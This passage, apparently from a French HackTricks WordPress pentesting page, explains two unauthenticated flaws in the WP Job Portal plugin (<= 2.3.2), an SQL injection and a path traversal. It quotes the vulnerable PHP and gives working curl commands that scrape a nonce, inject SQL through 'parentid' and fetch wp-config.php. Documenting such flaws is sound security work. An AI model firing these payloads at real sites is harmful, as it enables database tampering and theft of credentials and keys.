- **Limitez les tentatives de connexion** pour prévenir les attaques Brute Force
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'accès que depuis l'interne ou depuis certaines adresses IP.


### SQL Injection non authentifiée due à une validation insuffisante (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal exposait une tâche **savecategory** qui exécute finalement le code vulnérable suivant dans `modules/category/model.php::validateFormData()` :
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problèmes introduits par cet extrait :

1. **Entrée utilisateur non assainie** – `parentid` provient directement de la requête HTTP.
2. **Concaténation de chaînes dans la clause WHERE** – pas de `is_numeric()` / `esc_sql()` / prepared statement.
3. **Accessible sans authentification** – bien que l'action soit exécutée via `admin-post.php`, la seule vérification en place est un **CSRF nonce** (`wp_verify_nonce()`), que n'importe quel visiteur peut récupérer depuis une page publique incorporant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Récupérer un nonce récent :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter du SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La réponse divulgue le résultat de la requête injectée ou modifie la base de données, prouvant une SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Une autre tâche, **downloadcustomfile**, permettait aux visiteurs de télécharger **n'importe quel fichier sur le disque** via path traversal. Le sink vulnérable se trouve dans `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contrôlé par l'attaquant et concaténé **sans assainissement**.  Encore une fois, la seule barrière est un **CSRF nonce** qui peut être récupéré depuis la page du CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur répond avec le contenu de `wp-config.php`, leaking DB credentials and auth keys.

## Références

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
